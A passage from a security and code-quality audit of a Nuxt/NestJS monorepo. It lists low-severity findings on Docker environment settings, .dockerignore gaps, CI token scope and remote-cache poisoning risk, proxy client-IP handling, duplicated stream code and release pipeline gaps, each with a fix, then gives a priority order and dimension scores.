**File:** `apps/api/Dockerfile:99` (only `ENV_NAME=production`); Joi defaults `NODE_ENV` to `development` (`env.validation.ts:6-8`). As a result, `FLEET_TEST_HOOKS`' guard "never under NODE_ENV=production" (`apps/api/src/config/fleet.config.ts:150-151`) does nothing in the shipped image, and the only remaining protection is not setting the flag. **Fix:** `ENV NODE_ENV=production` in the final stage, after checking nothing depends on `development` at runtime (`@nathapp/nestjs-common` i18n uses `dist/` unless `NODE_ENV == "development"`, so production is the correct value).

#### SEC-12 [LOW] `.dockerignore` excludes only the root `.env`
**File:** `.dockerignore` (`.env`, `.env.*` match only at the context root). `apps/api/.env` (present locally, gitignored) is copied by `COPY --link apps/ ./apps/` into the `prune` and `builder` stages of local `docker compose build`. It does not reach the final images, but it sits in the local build cache. `apps/web/.output`, `playwright-report` and `test-results` are also sent as context. **Fix:** add `**/.env`, `**/.env.*`, `!**/.env.example`, `**/.output`, `**/playwright-report`, `**/test-results`.

#### SEC-13 [LOW] CI exposes `TURBO_TOKEN` to every job, including same-repo PR branches, and has no `permissions:` block
**File:** `.github/workflows/ci.yml:30-32` (workflow-level `env`), no top-level `permissions`. Anyone with branch-push rights can open a PR and write arbitrary artifacts to the turbo remote cache, which `main` builds consume (remote cache poisoning). The default `GITHUB_TOKEN` scope follows the repo setting. **Fix:** `permissions: contents: read`. Give PR jobs a read-only cache (`TURBO_REMOTE_CACHE_READ_ONLY=true` when `github.event_name == 'pull_request'`) and enable turbo artifact signing (`remoteCache.signature: true` + `TURBO_REMOTE_CACHE_SIGNATURE_KEY`).

#### ENH-2 [LOW] SSE proxies send no `x-client-ip`, and client IP collapses behind a reverse proxy
**Files:** `apps/web/server/utils/live-proxy.ts:92-94` (headers are only `accept` and `cookie`); `server/utils/client-ip.ts:9-10,29`. The live routes are `@SkipThrottle`, so this affects only audit and logs (they record the Nuxt container IP). More importantly, when koda-wk or any deployment fronts Nuxt with nginx, every browser resolves to the proxy's IP and shares one throttle bucket. One user's failed logins can then 429 everyone's login. The code comment acknowledges this. **Fix:** add `clientIpHeaders(event.context.clientIp)` to the SSE upstream headers, and add an opt-in `NUXT_TRUSTED_PROXIES` that reads `X-Forwarded-For` right-to-left past trusted hops.

#### STYLE-1 [LOW] Duplicated stream-recovery logic
**Files:** `apps/web/lib/thread-event-stream.ts:62-153` vs `apps/web/lib/project-event-stream.ts:185-277`. `recover`/`open`/`close`/dedupe are copied nearly verbatim, so BUG-3's fix has to be made twice. **Fix:** extract `createResilientEventSource(url, attachListeners, deps)` and have both stream factories supply only their listener wiring.

#### OPS-1 [LOW] (prior, still open) Release pipeline gaps
`TURBO_TOKEN` is passed as a build-arg while the Dockerfiles expect a BuildKit secret (`release.yml:149,186`), so the Docker builds never hit the remote cache. Release is not gated on CI success. `rollback.sh:69` uses GNU `sed -i` (fails on macOS hosts) and does not roll back Postgres migrations. **Fix:** `secrets: TURBO_TOKEN=${{ secrets.TURBO_TOKEN }}` on build-push-action; add a `needs:` test job or a `workflow_run` gate on CI; make `sed -i.bak` portable; document forward-only migrations in the rollback README.

---

### Priority fix order

| P | ID | Effort | Why |
|:--|:--|:--|:--|
| P1 | BUG-1 | M | Every new tab after 15 idle min forces a re-login; this is the remaining M22 symptom |
| P1 | SEC-3 | S | One-line fail-closed change; default secrets allow token forgery |
| P1 | SEC-1 | S/M | Logout must revoke |
| P1 | BUG-2 | S | Email and notification links are effectively broken |
| P2 | BUG-3 | M | Each deploy silently kills live updates in all open tabs |
| P2 | SEC-2 | S | Close the last raw API-path interpolation and widen the guard |
| P2 | SEC-5, SEC-6, SEC-7 | S | Compose hardening (unpublish API/Ollama, token TTLs) |
| P2 | SEC-4 | S | Non-root API image |
| P2 | SEC-8, BUG-4 | S/M | Release least-privilege, SHA pins, tag checkout |
| P3 | LOW items | S | Hygiene |

---

### Scores (0-20)

| Dimension | Score | Rationale |
|:--|:--|:--|
| Security | 14 | The BFF design is sound (httpOnly + Strict cookies, fixed upstream host, path-param validation, DOMPurify with tight allowlists, safe-href everywhere). Points lost to logout not revoking, fail-open example secrets, root API image, published API/Ollama ports, 7-day access tokens, broad release permissions and unpinned actions. |
| Reliability | 12 | The session lifecycle has real holes: no SSR refresh (BUG-1), outage treated as logout with permanent stream stop (BUG-3), lost deep links (BUG-2). SSE abort-on-close, bounded lists and listener cleanup are well done. |
| API Design | 15 | Clean separation: Nitro auth routes own cookies, the catch-all owns everything else, and the SSE routes share one validated core. `forwardToApi` with `ignoreResponseError` pushes status handling onto callers, which `logout` gets wrong. The refresh API has no tri-state result. |
| Code Quality | 16 | Small, well-commented, testable pure helpers (`proxy-target`, `client-ip`, `live-proxy`, `api-path`, `safe-url`). The immutability style is consistent. There is duplication between the two event-stream factories, and the `apiPath` guard regex is narrower than its intent. |
| Best Practices | 13 | CI now builds web, lints `.vue`, and uses env-passed SHAs. Release uses workflow-wide write and OIDC permissions, tag-pinned actions, inline `${{ }}` in `run:`, no tag checkout on re-publish and no CI gate. Compose and deploy defaults are not production-safe. No CSP or security headers. |
| **Total** | **70/100** | |
